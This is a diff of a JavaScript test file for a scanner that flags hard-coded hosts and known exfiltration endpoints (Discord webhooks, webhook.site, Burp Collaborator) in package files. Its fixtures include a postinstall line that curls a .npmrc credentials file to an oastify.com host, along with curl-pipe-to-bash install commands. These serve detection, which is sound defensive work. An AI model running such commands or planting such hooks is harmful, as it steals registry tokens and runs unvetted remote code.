@@ -17,11 +17,13 @@ test('a script names the hosts of the URLs in its strings, each with the line it
   assert.deepEqual(hosts('lib/a.js', 'get("http://45.12.3.9:8080/p")\nget("https://user:pw@evil.co/x")\nget("ftp://files.host.net/x")\nget("https://EVIL.co/again")\n'),
     { '45.12.3.9': 1, 'evil.co': 2, 'files.host.net': 3 }, 'an address, a user\'s name and port aside; each host once')
   assert.deepEqual(hosts('bin/cli', '#!/usr/bin/env node\nget("https://registry.example.dev/x")\n'), { 'registry.example.dev': 2 }, 'a script node runs by its hashbang')
+  assert.deepEqual(hosts('lib/a.js', 'if (/^https:\\/\\/api\\.evil\\.co\\//.test(url)) send(url)\n'), { 'api.evil.co': 1 }, 'a regular expression\'s, its slashes and dots escaped')
 })
 
 test('a host named in a comment, built as the code runs, local, reserved or a namespace, is none', () => {
   assert.equal(hosts('lib/a.js', '// see https://github.com/org/repo\n/* https://docs.example.dev/api */\nconst a = 1\n'), null, 'comments, as a link to docs')
-  assert.equal(hosts('lib/a.js', 'fetch(`https://${host}/x`)\nfetch(`https://api.${domain}/x`)\nfetch("https://" + host)\n'), null, 'built as it runs')
+  assert.equal(hosts('lib/a.js', 'fetch(`https://${host}/x`)\nfetch(`https://api.${domain}/x`)\nfetch("https://" + host)\nfetch(`https://api.service.com.${tld}/x`)\n'), null,
+    'built as it runs, whole or its last labels')
   assert.equal(hosts('lib/a.js', ['http://localhost:3000', 'http://127.0.0.1/x', 'http://0.0.0.0', 'https://example.com', 'https://api.example.org/x', 'http://app.test',
     'http://printer.local', 'http://www.w3.org/2000/svg', 'http://a.localhost'].map(url => `get("${url}")`).join('\n')), null, 'local, reserved for examples and tests, or a namespace')
   assert.equal(hosts('lib/a.js', 'get("https://999.1.1.1/x")\nget("https://intranet/x")\n'), null, 'no address, nor a name without a domain')
@@ -38,10 +40,12 @@ test('a file names the hosts malicious packages send what they take to, wherever
   assert.deepEqual(exfiltration('setup.sh', 'curl -fsSL https://bun.com/install | bash\n'), { bun: [1] }, 'Bun\'s install script at its new host, in any text')
   assert.deepEqual(exfiltration('package.json', '{"scripts":{"postinstall":"curl -d @.npmrc https://abc.oastify.com"}}'), { oast: [1] }, 'Burp Collaborator\'s')
   assert.deepEqual(exfiltration('lib/y.js', 'get("https://canary.discord.com/api/v10/webhooks/1/x")\nget("https://discordapp.com/api/webhooks/2/y")\n'), { discord: [1, 2] })
-  assert.deepEqual(exfiltration('lib/y.js', 'throw new Error("Could not reach webhook.site.")\n'), { 'webhook-site': [1] }, 'a sentence ending after it')
+  assert.deepEqual(exfiltration('lib/y.js', 'throw new Error("Could not reach webhook.site.")\nconst s = "run curl https://bun.sh/install."\n'), { 'webhook-site': [1], bun: [2] },
+    'a sentence ending after it')
   for (const lookalike of ['go("notwebhook.site")', 'go("https://webhook.sites")', 'go("https://discord.com/channels/1")', 'go("https://bun.sh/docs")',
     'go("https://slack.com/api/chat.postMessage")', 'go("https://telegram.org")', 'go("https://bun.sh/installer")',
-    'go("https://webhook.site.evil.example/x")', 'go("https://api.telegram.org.attacker.com/bot")', 'go("ipinfo.io.cn")']) {
+    'go("https://webhook.site.evil.example/x")', 'go("https://api.telegram.org.attacker.com/bot")', 'go("ipinfo.io.cn")',
+    'go("https://bun.sh/install.sh")', 'go("https://discord.com/api/webhooks.json")', 'go("https://hooks.slack.com/services.example")']) {
     assert.equal(exfiltration('lib/z.js', lookalike), null, lookalike)
   }
   for (const path of ['README.md', 'docs/exfil.md', 'CHANGELOG', 'dist/a.js.map']) assert.equal(exfiltration(path, text), null, path)
